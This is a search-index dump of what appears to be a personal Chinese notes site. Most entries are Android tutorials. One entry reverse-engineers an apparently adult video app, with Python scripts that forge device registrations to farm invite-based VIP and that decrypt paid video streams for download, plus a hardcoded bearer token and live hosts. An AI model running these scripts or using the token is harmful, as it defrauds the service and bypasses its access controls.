[{"id":0,"href":"/docs/re/new/","title":"demo","section":"re","content":"实例\n"},{"id":1,"href":"/docs/re/","title":"re","section":"Docs","content":"一些逆向笔记，以及实例\n"},{"id":2,"href":"/docs/code/android/ui/","title":"Android ui","section":"Android","content":"\r控件\r#\r不讲\n布局\r#\r3种基本布局\nLinearLayout 线性布局，可使用android:orientation来控制排列方向 layout_weight，权重，根据父权进行分配，常配合0dp使用 RelativeLayout 相对布局，其属相之多，但简单 FrameLayout 帧布局，不讲，用得少 常见关键字 match_parent, 当前控件多的大小和父布局的大小一样 warp_content, 当前控件的大小能够刚好好汉里面的内容，由控件内容决定其大小 自定义控件\r#\r"},{"id":3,"href":"/docs/code/android/%E5%8D%8F%E7%A8%8B-retrofit/","title":"Android 协程-retrofit","section":"Android","content":"\r导入\r#\rdependencies { implementation \u0026#39;com.squareup.retrofit2:retrofit:2.6.1\u0026#39; implementation \u0026#39;com.squareup.retrofit2:converter-gson:2.6.1\u0026#39; } 第一个协程\r#\rclass MainActivity : AppCompatActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) getAppDataBtn.setOnClickListener { val retrofit = Retrofit.Builder() .baseUrl(\u0026#34;http://10.0.2.2/\u0026#34;) .addConverterFactory(GsonConverterFactory.create()) .build() val appService = retrofit.create(AppService::class.java) appService.getAppData().enqueue(object : Callback\u0026lt;List\u0026lt;App\u0026gt;\u0026gt; { override fun onResponse(call: Call\u0026lt;List\u0026lt;App\u0026gt;\u0026gt;, response: Response\u0026lt;List\u0026lt;App\u0026gt;\u0026gt;) { val list = response.body() if (list != null) { for (app in list) { Log.d(\u0026#34;MainActivity\u0026#34;, \u0026#34;id is ${app.id}\u0026#34;) Log.d(\u0026#34;MainActivity\u0026#34;, \u0026#34;name is ${app.name}\u0026#34;) Log.d(\u0026#34;MainActivity\u0026#34;, \u0026#34;version is ${app.version}\u0026#34;) } } } override fun onFailure(call: Call\u0026lt;List\u0026lt;App\u0026gt;\u0026gt;, t: Throwable) { t.printStackTrace() } }) } } } 定义接口\r#\rinterface AppService{ //静态 @GET(\u0026#34;get_data.json\u0026#34;) fun getData(): Call\u0026lt;Data\u0026gt; //动态参数 @GET(\u0026#34;page/{page}/get_data.json\u0026#34;) fun getPageData(@Path(\u0026#34;page\u0026#34;) page:Int): Call\u0026lt;Data\u0026gt; //get 带参数 @GET(\u0026#34;user/login\u0026#34;) fun login(@Query(\u0026#34;username\u0026#34;) username:String,@Query(\u0026#34;password\u0026#34;) password:String): Call\u0026lt;ResponseBody\u0026gt; //post @POST(\u0026#34;user/login\u0026#34;) fun login(@Body data:Data): Call\u0026lt;ResponseBody\u0026gt; //指定静态header呢 @Header(\u0026#34;sign: 123\u0026#34;) //动态Header @POST(\u0026#34;user/login\u0026#34;) fun login(@Header(\u0026#34;sign\u0026#34;) sign:String,@Body data:Data): Call\u0026lt;ResponseBody\u0026gt; } 论Retrofit构建起的最佳写法\r#\r先写一个ServiceCretaor单例类\nobject ServiceCreator{ private const val BASE_URL = \u0026#34;http://10.0.2.2/\u0026#34; private val retrofit = Retrofit.Builder() .baseUrl(BASE_URL) .addConverterFactory(GsonConverterFactory.create()) .build() fun \u0026lt;T\u0026gt; create(serviceClass: Class\u0026lt;T\u0026gt;): T = retrofit.create(serviceClass) inline fun \u0026lt;reified T\u0026gt; create(): T = create(T::class.java) } 使用\nobject SmartCityNetwork { private val studentService = ServiceCreator.create(StudentService::class.java) suspend fun studentLogin(studentNumber:String, password:String)= studentService.studentLogin(studentNumber,password).await() private suspend fun \u0026lt;T\u0026gt; Call\u0026lt;T\u0026gt;.await():T{ return suspendCoroutine { enqueue(object : Callback\u0026lt;T\u0026gt; { override fun onResponse(call: Call\u0026lt;T\u0026gt;, response: Response\u0026lt;T\u0026gt;) { val body=response.body() if(body!=null) it.resume(body) else it.resumeWithException(RuntimeException(\u0026#34;response body is null\u0026#34;)) } override fun onFailure(call: Call\u0026lt;T\u0026gt;, t: Throwable) { it.resumeWithException(t) } }) } } } "},{"id":4,"href":"/docs/code/android/%E6%AF%94%E8%B5%9B/","title":"Android 比赛","section":"Android","content":"\r协程，构建，一个MVVM的frame\r#\r先是构建器\nobject ServiceCreator { private const val BASE_URL=\u0026#34;http://124.93.196.45:10001\u0026#34; private val retrofot: Retrofit = Retrofit.Builder() .baseUrl(BASE_URL) .addConverterFactory(GsonConverterFactory.create()) .build() fun \u0026lt;T\u0026gt; create(serviceClass:Class\u0026lt;T\u0026gt;): T= retrofot.create(serviceClass) inline fun \u0026lt;reified T\u0026gt;create():T= create(T::class.java) } 然后是接口\ninterface NewsService { @GET(\u0026#34;/prod-api/press/category/list\u0026#34;) fun getNewsType(): Call\u0026lt;NewsType\u0026gt; @GET(\u0026#34;/prod-api/press/press/list\u0026#34;) fun getNewsList(@Query(\u0026#34;id\u0026#34;) id:String,@Query(\u0026#34;hot\u0026#34;) hot:String):Call\u0026lt;NewsList\u0026gt; } 写一个Network\nobject SmartCityNetwork { private val userService= ServiceCreator.create\u0026lt;UserService\u0026gt;() suspend fun login(data: LoginData) = userService.loginService(data).await() private val AdvService=ServiceCreator.create\u0026lt;MetroService\u0026gt;() suspend fun getAdv()=AdvService.getAdv().await() private val newsService=ServiceCreator.create\u0026lt;NewsService\u0026gt;() suspend fun getNewsType()=newsService.getNewsType().await() suspend fun getNewsList(id :String,hot:String)= newsService.getNewsList(id,hot).await() private suspend fun \u0026lt;T\u0026gt; Call\u0026lt;T\u0026gt;.await(): T { return suspendCoroutine { enqueue(object : Callback\u0026lt;T\u0026gt; { override fun onResponse(call: Call\u0026lt;T\u0026gt;, response: Response\u0026lt;T\u0026gt;) { val body = response.body() if (body != null) it.resume(body) else it.resumeWithException(RuntimeException(\u0026#34;response body is null\u0026#34;)) } override fun onFailure(call: Call\u0026lt;T\u0026gt;, t: Throwable) { it.resumeWithException(t) } }) } } } 处理返回数据，其实可以分开写不同的接口\nobject Repository { fun login(data:LoginData) = fire(Dispatchers.IO) { val loginResponse =SmartCityNetwork.login(data) if (loginResponse.code == 200) { val token = loginResponse.token Result.success(token) } else { // Result.success(loginResponse.msg) Result.failure(RuntimeException(\u0026#34;response status is${loginResponse.msg}\u0026#34;)) } } fun getAdv()= fire(Dispatchers.IO){ val loginResponse =SmartCityNetwork.getAdv() if (loginResponse.code == 200) { val rows = loginResponse.rows Result.success(rows) } else { Result.failure(RuntimeException(\u0026#34;response status is${loginResponse.msg}\u0026#34;)) } } fun getNewsType()= fire(Dispatchers.IO){ val type=SmartCityNetwork.getNewsType() if(type.code==200){ val rows=type.rows Result.success(rows) }else{ Result.failure(RuntimeException(\u0026#34;response status is${type.msg}\u0026#34;)) } } fun getNewsList(id:String,hot:String)= fire(Dispatchers.IO){ val resp=SmartCityNetwork.getNewsList(id,hot) if(resp.code==200){ var rows=resp.rows //限定20个 if(resp.rows.size\u0026gt;20){ rows=resp.rows.subList(0,20) } Result.success(rows) }else{ Result.failure(RuntimeException(\u0026#34;response status is${resp.msg}\u0026#34;)) } } private fun \u0026lt;T\u0026gt; fire(context: CoroutineContext, block: suspend () -\u0026gt; Result\u0026lt;T\u0026gt;) = liveData\u0026lt;Result\u0026lt;T\u0026gt;\u0026gt;(context) { val result = try { block() } catch (e: Exception) { Result.failure\u0026lt;T\u0026gt;(e) } emit(result) } } viewModel\nclass HomeViewModel : ViewModel() { private val imgFlag = MutableLiveData\u0026lt;String\u0026gt;() private val newsListData= MutableLiveData\u0026lt;String\u0026gt;() private var newsTypeFlag=MutableLiveData\u0026lt;String\u0026gt;() val adv=imgFlag.switchMap { Repository.getAdv() } val newsType=imgFlag.switchMap { Repository.getNewsType()} val newsList=newsListData.switchMap { Repository.getNewsList(it,\u0026#34;true\u0026#34;) } //这里没有参数,给一个go，让switchMap观察到 fun getAdv(){ this.imgFlag.value=\u0026#34;go\u0026#34; } fun getNewsType(){ this.newsTypeFlag.value=\u0026#34;go\u0026#34; } fun getNewsList(id:String){ this.newsListData.value= id } } view层\nval homeViewModel = ViewModelProvider(this)[HomeViewModel::class.java] _binding = FragmentHomeBinding.inflate(inflater, container, false) val root: View = binding.root //加载轮播图 homeViewModel.getAdv() val banner = binding.banner homeViewModel.adv.observe(this) { val resp = it.getOrNull() var imgs = mutableListOf\u0026lt;DataBean\u0026gt;() val baseUrl = \u0026#34;http://124.93.196.45:10001\u0026#34; if (resp != null) { for (i in resp) { Log.d(\u0026#34;img\u0026#34;, i.advImg) imgs.add(DataBean(baseUrl + i.advImg)) } banner.setAdapter(object : BannerImageAdapter\u0026lt;DataBean\u0026gt;(imgs) { override fun onBindView( holder: BannerImageHolder, data: DataBean, position: Int, size: Int ) { //图片加载自己实现 Glide.with(holder.itemView) .load(data.imageUrl) .apply(RequestOptions.bitmapTransform(RoundedCorners(30))) .into(holder.imageView) } }).addBannerLifecycleObserver(this).indicator = CircleIndicator(context) banner.setOnBannerListener { any, i -\u0026gt; when (i) { 0 -\u0026gt; Toast.makeText(myContext, (1).toString(), Toast.LENGTH_SHORT).show() 1 -\u0026gt; Toast.makeText(myContext, (i + 1).toString(), Toast.LENGTH_SHORT) .show() else -\u0026gt; Toast.makeText(myContext, \u0026#34;yiya~\u0026#34;, Toast.LENGTH_SHORT).show() } } } } 只能临时抱佛脚了\n饼图\nclass MyPieChart : AppCompatActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_my_pie_chart) // 创建数据集合 val entries = ArrayList\u0026lt;PieEntry\u0026gt;() entries.add(PieEntry(3f, \u0026#34;苹果\u0026#34;)) entries.add(PieEntry(4f, \u0026#34;香蕉\u0026#34;)) entries.add(PieEntry(2f, \u0026#34;橙子\u0026#34;)) entries.add(PieEntry(1f, \u0026#34;葡萄\u0026#34;)) // 创建数据集 val dataSet = PieDataSet(entries, \u0026#34;水果分布\u0026#34;) dataSet.colors = ColorTemplate.COLORFUL_COLORS.toMutableList() dataSet.setDrawIcons(false) // dataSet.isus // 创建数据对象 val pieData = PieData(dataSet) // 设置图表数据 pie_chart.data = pieData // 设置图表属性 pie_chart.invalidate() // 刷新图表 } } "},{"id":5,"href":"/docs/re/new/%E6%9F%90h%E8%A7%86%E9%A2%91%E8%BD%AF%E4%BB%B6/","title":"Android 比赛","section":"demo","content":"\r分析流程\r#\r这个软件呢，其实分析主要就是想要看他拉人获得vip的操作\n抓包可以找到一个api\napi/user/traveler 这之前token还没有得到，参数\n{\u0026#34;deviceId\u0026#34;: device, \u0026#34;dev\u0026#34;: 随机3字符, \u0026#34;code\u0026#34;: \u0026#39;{\u0026#34;p\u0026#34;:\u0026#34;PDTVPD\u0026#34;}\u0026#39;} 这个code参数其实开始我也不知道是啥，走了一遍拉人的流程，发现app给我们的邀请链接有p参数，就是邀请码\nhttps://z6mhir31k.xyz?p=PDTVPD 在进到网页中点击下载软件会将邀请码复制到我们的粘贴板上\n{\u0026#34;p\u0026#34;:\u0026#34;PDTVPD\u0026#34;} 当你进入app时，读取粘贴板的第一条数据\npublic static String u() { ClipData v0 = FragmentAnim.f.getSystemService(\u0026#34;clipboard\u0026#34;).getPrimaryClip(); String v1 = \u0026#34;\u0026#34;; if(v0 != null \u0026amp;\u0026amp; v0.getItemCount() \u0026gt; 0) { CharSequence v0_1 = v0.getItemAt(0).getText(); if(TextUtils.isEmpty(v0_1)) { return v1; } else { return v0_1.toString(); } } return v1; } deviceId\r#\r顺着上去就发现了deviceId的生成\npublic final void C() { String v0_2; String v3_1; String v1 = \u0026#34;everb\u0026#34;; String v2 = \u0026#34;\u0026#34;; if(a.a.exists()) { try { ObjectInputStream v0_1 = new ObjectInputStream(new FileInputStream(a.a)); Object v3 = v0_1.readObject(); try { v0_1.close(); goto label_21; } catch(Exception v0) { } } catch(Exception v0) { v3_1 = v2; } Log.d(v1, v0.toString()); } else { v3_1 = v2; } label_21: if(v3_1 == null) { Log.d(v1, \u0026#34;data == null\u0026#34;); v3_1 = v2; } if(TextUtils.isEmpty(((CharSequence)v3_1))) { v0_2 = String.valueOf(System.currentTimeMillis() + UUID.randomUUID().getLeastSignificantBits()); try { byte[] v0_4 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(v0_2.getBytes()); StringBuilder v1_1 = new StringBuilder(); int v5; for(v5 = 0; v5 \u0026lt; v0_4.length; ++v5) { String v6 = Integer.toHexString(v0_4[v5] \u0026amp; 0xFF); if(v6.length() \u0026lt; 2) { v1_1.append(0); } v1_1.append(v6); } v3_1 = v1_1.toString(); } 他会打开是个名为.CAD的文件，把deviceid写进去,如果像要看一遍生成新device，记得删除这个文件\n但是我却没有搞懂这个deviceID的鉴别方法，你自己随便改一两位他都不会返回，看不懂\n下面是用python模拟生成的deviceid\nimport uuid,hashlib,unpack t = int(time.time()*1000) uuid_bytes = uuid.uuid1().bytes leastbit = struct.unpack(\u0026#39;\u0026gt;q\u0026#39;, uuid_bytes[8:])[0] print(leastbit) v4 = hashlib.md5(str(t+leastbit).encode()).digest() v2 = [] for i in v4: v1 = hex(i \u0026amp; 0xFF)[2:] if len(v1) \u0026lt; 2: v1 = \u0026#34;0\u0026#34;+v1 v2.append(v1) device = \u0026#39;\u0026#39;.join(v2) 这个几把最低64位真的搞得烦，没见过\n里面其实还有个chcode不知道是啥\npublic JSONObject c(String arg5, String arg6) { this.a(\u0026#34;deviceId\u0026#34;, arg5); Random v5 = new Random(); StringBuffer v0 = new StringBuffer(); int v1; for(v1 = 0; v1 \u0026lt; 3; ++v1) { v0.append(\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34;.charAt(v5.nextInt(62))); } this.a(\u0026#34;dev\u0026#34;, v0.toString()); if(arg6 != null) { this.a(\u0026#34;code\u0026#34;, arg6); } try { arg5 = FragmentAnim.f.getPackageManager().getApplicationInfo(FragmentAnim.f.getPackageName(), 0x80).metaData.getString(\u0026#34;UMENG_CHANNEL\u0026#34;); } catch(PackageManager$NameNotFoundException ) { arg5 = \u0026#34;\u0026#34;; } StringBuilder v6 = new StringBuilder(); v6.append(\u0026#34;--------------\u0026gt;\u0026#34;); v6.append(arg5); String v0_1 = \u0026#34;渠道号：\u0026#34;; Log.e(v0_1, v6.toString()); if(!TextUtils.isEmpty(((CharSequence)arg5)) \u0026amp;\u0026amp; !arg5.equals(FragmentAnim.A())) { this.a(\u0026#34;chCode\u0026#34;, arg5); Log.e(v0_1, \u0026#34;chCode--------------\u0026gt;\u0026#34; + arg5); } return b.b; } header\r#\r在上面那个api中header中的s和t\nimport time,hashlin t=str(int(time.time()*1000)) s=hsahlib.md5(t[3:8].encode()).hesdigest() 到最后我发现妈的这软件好像也不加头，我的vip啊，也有可能是我哪里遗漏了些什么\n注意ua,没带或者ua有问题都不会返回token，我在网上找的爬虫ua就不行，用模拟器自己生成的ua就行\n个人里面那个填写invitecode的地方好像也是摆设\nencData\r#\r在后面返回数据里encData是有加密的，aes/cbc/pkcs7,key和iv都是一样的\nJhbGciOiJIUzI1Ni m3u8解密\r#\rm3u8文件解密，得到的m3u8文件里的key是假的\n看了几个关于m3u8的类\n会找到getkeyPath这个方法\nkey是在本地文件kdbc/kb里，把key copy出来\n配合N_m3u8DL-CLI可以下载m3u8文件\n打印N_m3u8DL-CLI的命令,视频存放在Videos目录\ndef download(): id = \u0026#39;1570\u0026#39; # 143811 # 24323 t = str(int(time.time()*1000)) header = {\u0026#39;deviceid\u0026#39;: \u0026#39;ac6819db96c1892587d63f353bd9a51c\u0026#39;, \u0026#39;t\u0026#39;: t, \u0026#39;s\u0026#39;: hashlib.md5(t[3:8].encode()).hexdigest(), \u0026#39;authorization\u0026#39;: \u0026#39;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMzMzNjQwNyIsImlzcyI6IiIsImlhdCI6MTY3MTI3NTY5NCwibmJmIjoxNjcxMjc1Njk0LCJleHAiOjE4Mjg5NTU2OTR9.766BQyjE6ZO5ZPC5Y6J0i5BZKmezUk7CXYo-cStNp_w\u0026#39; } res = requests.get( f\u0026#39;https://mhapp.vxxsred.xyz/api/video/getVideoById?videoId={id}\u0026#39;, headers=header).json() # print(res) data = res[\u0026#39;encData\u0026#39;] data = AES_decrypt(data, \u0026#39;JhbGciOiJIUzI1Ni\u0026#39;, \u0026#39;JhbGciOiJIUzI1Ni\u0026#39;) print(data) data = json.loads(data) print(data[\u0026#39;videoUrl\u0026#39;]) print(\u0026#39;\u0026#34;https://nwretbns.yongchengge.cn/\u0026#39; + data[\u0026#39;videoUrl\u0026#39;]+r\u0026#39;\u0026#34; --workDir \u0026#34;C:\\Users\\xx\\Videos\u0026#34; --useKeyFile \u0026#34;C:\\Users\\xx\\Desktop\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\\key\\kb\u0026#34;\u0026#39;) # https://videossy.tsk12.top/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8/ # lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8 # \u0026#34;https://nwretbns.yongchengge.cn/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8\u0026#34; --workDir \u0026#34;E:\\tools\\other\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\u0026#34; --useKeyFile \u0026#34;C:\\Users\\jinchuan\\Desktop\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\\key\\kb\u0026#34; # https://nwretbns.yongchengge.cn/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8 全部代码\nimport hashlib import time import requests from Crypto.Cipher import AES import base64 import json import struct import uuid import random import string def add(text, L=16): l = len(text) if l \u0026lt; L: text = text+\u0026#39;\\0\u0026#39;*(L-l) elif l \u0026gt; L: text = text+\u0026#39;\\0\u0026#39;*(L-l % L) return text.encode() def AES_decrypt(cipher, key, iv): aes = AES.new(add(key), AES.MODE_CBC, add(iv)) return aes.decrypt(base64.b64decode(cipher.encode())).decode().replace(\u0026#39;\\x08\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;\\x0f\u0026#39;, \u0026#39;\u0026#39;) def download(): id = \u0026#39;1570\u0026#39; # 143811 # 24323 t = str(int(time.time()*1000)) header = {\u0026#39;deviceid\u0026#39;: \u0026#39;ac6819db96c1892587d63f353bd9a51c\u0026#39;, \u0026#39;t\u0026#39;: t, \u0026#39;s\u0026#39;: hashlib.md5(t[3:8].encode()).hexdigest(), \u0026#39;authorization\u0026#39;: \u0026#39;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMzMzNjQwNyIsImlzcyI6IiIsImlhdCI6MTY3MTI3NTY5NCwibmJmIjoxNjcxMjc1Njk0LCJleHAiOjE4Mjg5NTU2OTR9.766BQyjE6ZO5ZPC5Y6J0i5BZKmezUk7CXYo-cStNp_w\u0026#39; } res = requests.get( f\u0026#39;https://mhapp.vxxsred.xyz/api/video/getVideoById?videoId={id}\u0026#39;, headers=header).json() # print(res) data = res[\u0026#39;encData\u0026#39;] data = AES_decrypt(data, \u0026#39;JhbGciOiJIUzI1Ni\u0026#39;, \u0026#39;JhbGciOiJIUzI1Ni\u0026#39;) print(data) data = json.loads(data) print(data[\u0026#39;videoUrl\u0026#39;]) print(\u0026#39;\u0026#34;https://nwretbns.yongchengge.cn/\u0026#39; + data[\u0026#39;videoUrl\u0026#39;]+r\u0026#39;\u0026#34; --workDir \u0026#34;C:\\Users\\jinchuan\\Videos\u0026#34; --useKeyFile \u0026#34;C:\\Users\\jinchuan\\Desktop\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\\key\\kb\u0026#34;\u0026#39;) # https://videossy.tsk12.top/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8/ # lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8 # \u0026#34;https://nwretbns.yongchengge.cn/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8\u0026#34; --workDir \u0026#34;E:\\tools\\other\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\u0026#34; --useKeyFile \u0026#34;C:\\Users\\jinchuan\\Desktop\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\\key\\kb\u0026#34; # https://nwretbns.yongchengge.cn/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8 def r(n): return \u0026#39;\u0026#39;.join(random.choice(string.ascii_letters + string.digits) for _ in range(n)) ua=\u0026#39;Mozilla/5.0 (Linux; Android 7.1.2; HD1910 Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36;SuiRui/mh/ver=1.1.5\u0026#39; def com(url): result=requests.get(url,proxies={\u0026#39;https\u0026#39;:\u0026#39;127.0.0.1:7890\u0026#39;},headers={\u0026#39;user-agent\u0026#39;:ua}) def traveler(): api = \u0026#39;https://mhapp.vxerfxs.shop/api/user/traveler\u0026#39; t = int(time.time()*1000) uuid_bytes = uuid.uuid1().bytes leastbit = struct.unpack(\u0026#39;\u0026gt;q\u0026#39;, uuid_bytes[8:])[0] print(leastbit) v4 = hashlib.md5(str(t+leastbit).encode()).digest() v2 = [] for i in v4: v1 = hex(i \u0026amp; 0xFF)[2:] if len(v1) \u0026lt; 2: v1 = \u0026#34;0\u0026#34;+v1 v2.append(v1) device = \u0026#39;\u0026#39;.join(v2) data = {\u0026#34;deviceId\u0026#34;: device, \u0026#34;dev\u0026#34;: r(3), \u0026#34;code\u0026#34;: \u0026#39;{\u0026#34;p\u0026#34;:\u0026#34;PDTVPD\u0026#34;}\u0026#39;} print(data) t=int(time.time()*1000) header = { \u0026#39;deviceid\u0026#39;: device, \u0026#39;t\u0026#39;: str(t), \u0026#39;s\u0026#39;: hashlib.md5(str(t)[3:8].encode()).hexdigest(), \u0026#39;user-agent\u0026#39;:ua } result = requests.post(api, json=data, headers=header,proxies={\u0026#39;https\u0026#39;:\u0026#39;127.0.0.1:7890\u0026#39;}) print(result.status_code, result.text) com(\u0026#39;https://z6mhir31k.xyz?p=PDTVPD\u0026#39;) traveler() # https://z6mhir31k.xyz?p=LVMC5Y "},{"id":6,"href":"/docs/code/android/2024%E5%B9%B4-%E6%96%B0/%E7%A2%8E%E7%A2%8E%E5%BF%B5/","title":"android 碎念","section":"Android","content":"安卓 实现卡片\n圆角程度 cardCornerRadius 阴影: cardElevation\n\u0026lt;androidx.cardview.widget.CardView xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; xmlns:app=\u0026#34;http://schemas.android.com/apk/res-auto\u0026#34; app:cardCornerRadius=\u0026#34;20dp\u0026#34; android:layout_marginBottom=\u0026#34;20dp\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;/androidx.cardview.widget.CardView\u0026gt; "},{"id":7,"href":"/docs/code/android/%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/","title":"Android 网络请求","section":"Android","content":"异步get请求\nprivate fun asyncGet() { val url = \u0026#34;\u0026#34; //创建request请求对象 val request = Request.Builder() .url(url) //.method()方法与.get()方法选取1种即可 .method(\u0026#34;GET\u0026#34;, null) .build() //创建call并调用enqueue()方法实现网络请求 OkHttpClient().newCall(request) .enqueue(object : Callback { override fun onFailure(call: Call, e: IOException) { } override fun onResponse(call: Call, response: Response) { } }) } 异步post请求\nprivate fun asyncPost() { val url = \u0026#34;\u0026#34; //添加post请求参数 val requestBody = FormBody.Builder() .add(\u0026#34;userName\u0026#34;, \u0026#34;name\u0026#34;) .add(\u0026#34;passWord\u0026#34;, \u0026#34;pass\u0026#34;) .build() //发送josn //var jsonObject = JSONObject() //jsonObject.put(\u0026#34;studentNumber\u0026#34;,\u0026#34;1713630001\u0026#34;) //jsonObject.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;) //val requestBody=jsonObject.toString().toRequestBody(\u0026#34;application/json\u0026#34;.toMediaType()) //创建request请求对象 val request = Request.Builder() .url(url) .post(requestBody) .build() //创建call并调用enqueue()方法实现网络请求 OkHttpClient().newCall(request) .enqueue(object : Callback { override fun onFailure(call: Call, e: IOException) { } override fun onResponse(call: Call, response: Response) { } }) } post json\nprivate fun asyncPost() { val url = \u0026#34;http://8.137.8.86/api/student/login\u0026#34; var jsonObject = JSONObject() jsonObject.put(\u0026#34;studentNumber\u0026#34;,\u0026#34;1713630001\u0026#34;) jsonObject.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;) val jsonBody=jsonObject.toString().toRequestBody(\u0026#34;application/json\u0026#34;.toMediaType()) //创建request请求对象 val request = Request.Builder() .url(url) .post(jsonBody) .build() //创建call并调用enqueue()方法实现网络请求 OkHttpClient().newCall(request) .enqueue(object : Callback { override fun onFailure(call: Call, e: IOException) { } override fun onResponse(call: Call, response: Response) { response.body?.string()?.let { Log.d(\u0026#34;resp\u0026#34;, it) } } }) } 等待数据，刷新ui\nprivate fun asyncPost() { Thread{ //为了防止堵塞主线程，在开启一个线程 //把下面代码放到这里 val url = \u0026#34;http://8.137.8.86/api/student/login\u0026#34; var jsonObject = JSONObject() jsonObject.put(\u0026#34;studentNumber\u0026#34;,\u0026#34;1713630001\u0026#34;) jsonObject.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;) val jsonBody=jsonObject.toString().toRequestBody(\u0026#34;application/json\u0026#34;.toMediaType()) //创建request请求对象 val request = Request.Builder() .url(url) .post(jsonBody) .build() //创建call并调用enqueue()方法实现网络请求 OkHttpClient().newCall(request) .enqueue(object : Callback { override fun onFailure(call: Call, e: IOException) { } override fun onResponse(call: Call, response: Response) { response.body?.string()?.let { Log.d(\u0026#34;resp\u0026#34;, it) } runOnUiThread{ //do something } } }) }.start() } 解析json数据\nobject FastJsonTest { @JvmStatic fun main(args: Array\u0026lt;String\u0026gt;) { parse() tojson() parseArray() } /** * 解析json数据 */ fun parse() { //JSON对象通常被序列化，也就是字符串形式 val jsonstr = \u0026#34;{code:0,msg:\u0026#39;查询用户信息\u0026#39; , user:{id:12,name:\u0026#39;Herrona\u0026#39;},list:[{id:1,name:\u0026#39;yg\u0026#39;},{id:2,name:\u0026#39;yf\u0026#39;}]}\u0026#34; //最顶层的JSON对象 val root = JSONObject.parseObject(jsonstr) println(\u0026#34;json数据：$root\u0026#34;) //获得整型数据 val code = root.getInteger(\u0026#34;code\u0026#34;) //获得字符串型数据 val msg = root.getString(\u0026#34;msg\u0026#34;) println(\u0026#34;代码：$code\u0026#34;) println(\u0026#34;消息：$msg\u0026#34;) //获得对象 val user = root.getJSONObject(\u0026#34;user\u0026#34;) println(\u0026#34;学号：\u0026#34; + user.getInteger(\u0026#34;id\u0026#34;)) println(\u0026#34;姓名：\u0026#34; + user.getString(\u0026#34;name\u0026#34;)) //获得数组类型的属性 val list = root.getJSONArray(\u0026#34;list\u0026#34;) //遍历数组 for (i in list.indices) { val obj = list[i] as JSONObject print(\u0026#34;账号：\u0026#34; + obj.getIntValue(\u0026#34;id\u0026#34;) + \u0026#34;\\t\u0026#34;) println(\u0026#34;姓名：\u0026#34; + obj.getString(\u0026#34;name\u0026#34;)) } } /** * 将某java对象转换为json对象 */ fun tojson() { val user = User() user.id = 12 user.name = \u0026#34;Herrona\u0026#34; val list: MutableList\u0026lt;User\u0026gt; = ArrayList() list.add(User(1, \u0026#34;yg\u0026#34;)) list.add(User(2, \u0026#34;yf\u0026#34;)) println(\u0026#34;将java对象转换为json对象:\u0026#34; + JSON.toJSON(user)) println(\u0026#34;将java对象列表转换为json对象:\u0026#34; + JSON.toJSON(list)) } /** * 解析数组类型 */ fun parseArray() { val jsonstr = \u0026#34;[{\u0026#39;name\u0026#39;:\u0026#39;yg\u0026#39;,\u0026#39;id\u0026#39;:1},{\u0026#39;name\u0026#39;:\u0026#39;yf\u0026#39;,\u0026#39;id\u0026#39;:2}]\u0026#34; //顶层是数组 val arr = JSON.parseArray(jsonstr) //遍历数组 for (i in arr.indices) { val obj = arr[i] as JSONObject print(\u0026#34;账号：\u0026#34; + obj.getIntValue(\u0026#34;id\u0026#34;) + \u0026#34;\\t\u0026#34;) println(\u0026#34;姓名：\u0026#34; + obj.getString(\u0026#34;name\u0026#34;)) } //已知元素类型 val list = JSON.parseArray(jsonstr, User::class.java) //第二个参数指定元素类型 for (user in list) { println(user) } } } /** * Title: User * Description: 用户对象 * @author Herrona */internal class User { var id: Int? = null var name: String? = null constructor() {} constructor(id: Int?, name: String?) : super() { this.id = id this.name = name } override fun toString(): String { return \u0026#34;学号：$id\\t姓名：$name\u0026#34; } } "},{"id":8,"href":"/docs/code/android/2024%E5%B9%B4-%E6%96%B0/%E9%80%82%E9%85%8D%E5%99%A8/","title":"Android 适配器","section":"Android","content":"由于是安卓原生开发，肯定是少不了写适配器的\n考虑到即使是cv也很费时间，所以写一个通用的适配器\nclass GenericAdapter\u0026lt;T\u0026gt;( private val items: List\u0026lt;T\u0026gt;, private val layoutId: Int, private val bind: (View, T) -\u0026gt; Unit ) : RecyclerView.Adapter\u0026lt;GenericAdapter.GenericViewHolder\u0026gt;() { class GenericViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): GenericViewHolder { val view = LayoutInflater.from(parent.context).inflate(layoutId, parent, false) return GenericViewHolder(view) } override fun onBindViewHolder(holder: GenericViewHolder, position: Int) { bind(holder.itemView, items[position]) } override fun getItemCount() = items.size } use\n需要设置每行的个数 binding.welfareType.layoutManager = 